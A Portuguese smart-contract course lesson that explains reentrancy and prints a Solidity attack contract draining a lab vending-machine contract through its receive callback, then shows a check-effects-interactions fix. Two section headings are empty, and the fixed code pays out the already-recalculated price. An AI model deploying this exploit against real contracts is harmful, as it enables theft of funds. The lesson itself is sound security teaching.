# Aula 6.3: Implementação e Segurança de Smartcontracts

## Introdução

Bem-vindos à nossa aula sobre a implementação de smartcontracts com foco em **segurança**, onde vamos construir uma **Vending Machine** que contém uma vulnerabilidade de **reentrância**. Essa vulnerabilidade será explorada através de um ataque, e posteriormente vamos aprender como corrigir esse problema.

A segurança é um dos aspectos mais críticos no desenvolvimento de contratos inteligentes, pois bugs e vulnerabilidades podem levar à perda de fundos ou ao comportamento inesperado dos contratos. Neste contexto, a reentrância é uma das falhas mais exploradas e será o foco desta aula.

---

## Introdução à Segurança

No desenvolvimento de smartcontracts, erros de segurança podem ter consequências catastróficas. A imutabilidade dos contratos na blockchain significa que, uma vez implantados, eles não podem ser alterados, a menos que já tenham sido projetados para isso. Portanto, é essencial abordar questões de segurança logo no início do processo de desenvolvimento.

### Principais ameaças em contratos inteligentes:

- **Reentrância**: Um ataque onde uma função externa é chamada repetidamente antes que o estado do contrato seja atualizado.
- **Overflow/Underflow de Inteiros**: Problema em que números ultrapassam os limites do tipo de dado e causam comportamentos indesejados.
- **Ataques de frontrunning**: Onde transações são interceptadas e executadas antes de uma transação legítima, geralmente por causa de discrepâncias no tempo de execução.
- **Ataques de controle de acesso**: Quando funções críticas estão abertas para serem chamadas por qualquer usuário, em vez de serem protegidas por modificadores de acesso.

O bug de reentrância foi o causador do famoso hack do **DAO** em 2016, que resultou na perda de milhões de dólares em Ethereum. Hoje, vamos ver como esse tipo de vulnerabilidade funciona e como podemos mitigá-lo.

---

## Correção do bug de Access Control

## Implementando uma Vending Machine

A **Vending Machine** é um contrato que permite aos usuários comprar e vender tokens ERC-20, simulando uma máquina de vendas automática. O contrato contém funções para:

- Comprar tokens com ETH.
- Vender tokens de volta por ETH.

## Explicação do Bug de Reentrância

1. O problema está na função `sellTokens`.
2. Quando um contrato recebe Ether, a função `receive` é chamada automaticamente.
3. Se a função `receive` do contrato atacante chamar de volta a função `sellTokens` antes que o contrato "vítima" finalize sua execução, ele pode entrar de novo no contrato de forma recursiva.
4. O problema é que o contrato "vítima" só atualiza o estado (como o saldo do usuário) no final da execução da função.
5. Isso permite que a reentrância aconteça repetidamente usando o estado anterior, já que o estado só é alterado após todas as chamadas recursivas. Isso permite drenar os fundos do contrato.

---

## Escrevendo um ataque para a função `sellTokens`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {VendorMachine} from "./VendorMachine.sol";
import {Token} from "./Token.sol";

contract ReentrancyAttack {
    VendorMachine public vendingMachine;
    Token public token;

    constructor(address _vendingMachine, address _token) {
        vendingMachine = VendorMachine(_vendingMachine);
        token = Token(_token);
    }

    function run() external payable {
        vendingMachine.buyTokens{value: 10 ether}();
        token.approve(address(vendingMachine), type(uint256).max);

        vendingMachine.sellTokens();
    }

    receive() external payable {
        // Executa o ataque de reentrância, chamando `sellTokens` repetidamente enquanto houver saldo
        if (address(vendingMachine).balance >= vendingMachine.price() && token.balanceOf(address(this)) > 0) {
            vendingMachine.sellTokens();
        }
    }
}
```

## Criando teste para executar o Ataque

---

## Corrigindo a Vulnerabilidade

A correção para esse tipo de ataque é simples, mas extremamente importante. Precisamos garantir que o estado do contrato seja atualizado **antes** de realizar qualquer transferência de ETH para o usuário. Isso pode ser feito reorganizando a função `sellTokens` para seguir o padrão **"verifique-efeitos-interaja"** (Check-Effects-Interactions).

```solidity
function sellTokens() external {
    if (token.balanceOf(msg.sender) < 1) {
        revert YouNotHaveEnoughTokens();
    } else if (address(this).balance < _price.unwrap()) {
        revert VendorMachineNotHaveETH();
    }

    // Atualiza o estado antes de interagir com o contrato externo
    try token.transferFrom(msg.sender, address(this), 1e18) {
        emit TokensSold(msg.sender, 1e18, _price.unwrap());

        // Ajusta o preço antes da interação externa
        _price = calculateNewPrice();
    } catch (bytes memory transfer_error) {
        assembly {
            revert(add(transfer_error, 32), mload(transfer_error))
        }
    }

    // Só depois de atualizar o estado, transferimos o ETH
    (bool ok, bytes memory data_error) = msg.sender.call{value: _price.unwrap()}("");
    if (!ok) {
        assembly {
            revert(add(data_error, 32), mload(data_error))
        }
    }
}
```

Agora, o estado do contrato é atualizado antes de transferirmos ETH para o usuário, prevenindo a reentrância.

---

## Encerramento do Curso

Com esta última aula, cobrimos os aspectos críticos do **desenvolvimento seguro de smartcontracts**, desde a introdução à **EVM**, passando pela criação de **tokens ERC-20**, até a identificação e correção de **vulnerabilidades de reentrância** em um contrato prático.

---

## Recapitulação

Nesta aula, abordamos:

- A **implementação de uma Vending Machine** para compra e venda de tokens ERC-20.
- A introdução à **segurança em contratos inteligentes**, com foco no ataque de reentrância.
- A escrita de um **contrato de ataque** para explorar a vulnerabilidade de reentrância.
- A **correção da vulnerabilidade** aplicando o padrão "verifique-efeitos-interaja".

---

## Lição de Casa

1. Implementar a **Vending Machine** em um ambiente local.
2. Reproduzir o **ataque de reentrância** para ver como ele funciona na prática.
3. Corrigir a vulnerabilidade de reentrância no contrato e testar novamente.
4. Explorar outras vulnerabilidades comuns, como **overflow** e **underflow**, e pesquisar como preveni-las.

---

## Próxima Aula

Na próxima aula, vamos concluir o curso entendando como integrar o Dev com o Ops.
